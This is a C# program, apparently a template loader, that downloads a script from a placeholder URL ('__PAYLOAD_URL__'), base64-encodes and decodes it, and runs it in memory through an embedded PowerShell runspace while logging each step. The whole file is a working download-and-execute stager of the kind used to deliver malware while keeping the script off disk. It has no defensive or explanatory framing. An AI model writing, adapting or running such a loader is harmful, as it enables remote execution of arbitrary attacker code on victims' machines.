using System;
using System.Net;
using System.Management.Automation;
using System.Text;

class Program
{
    static void Main()
    {
        Console.WriteLine("[INFO] Starting PowerShell script execution.");

        string payloadUrl = "__PAYLOAD_URL__";
        Console.WriteLine($"[INFO] Using payload URL: {payloadUrl}");

        string payloadContent = FetchPayload(payloadUrl);

        if (!string.IsNullOrEmpty(payloadContent))
        {
            Console.WriteLine("[INFO] Encoding fetched payload...");
            string encodedPayload = Convert.ToBase64String(Encoding.UTF8.GetBytes(payloadContent));

            ExecutePayload(encodedPayload);
        }
        else
        {
            Console.WriteLine("[ERROR] No payload fetched. Exiting...");
        }

        Console.WriteLine("Press Enter to exit...");
        Console.ReadLine();
    }

    static string FetchPayload(string url)
    {
        try
        {
            Console.WriteLine($"[INFO] Fetching payload from: {url}");
            using (WebClient client = new WebClient())
            {
                string content = client.DownloadString(url);
                Console.WriteLine("[SUCCESS] Payload fetched successfully!");
                return content;
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[ERROR] Failed to fetch payload: {ex.Message}");
            return null;
        }
    }

    static void ExecutePayload(string base64Payload)
    {
        try
        {
            Console.WriteLine("[INFO] Decoding payload...");
            string decodedPayload = Encoding.UTF8.GetString(Convert.FromBase64String(base64Payload));

            Console.WriteLine("[INFO] Executing payload in-memory...");
            using (PowerShell ps = PowerShell.Create())
            {
                ps.AddScript(decodedPayload);
                var results = ps.Invoke();

                Console.WriteLine("[INFO] Execution Results:");
                foreach (var result in results)
                {
                    Console.WriteLine(result);
                }

                if (ps.HadErrors)
                {
                    Console.WriteLine("[ERROR] PowerShell encountered errors:");
                    foreach (var error in ps.Streams.Error)
                    {
                        Console.WriteLine(error.ToString());
                    }
                }
            }
            Console.WriteLine("[SUCCESS] Payload executed!");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[ERROR] Failed to execute payload: {ex.Message}");
        }
    }
}


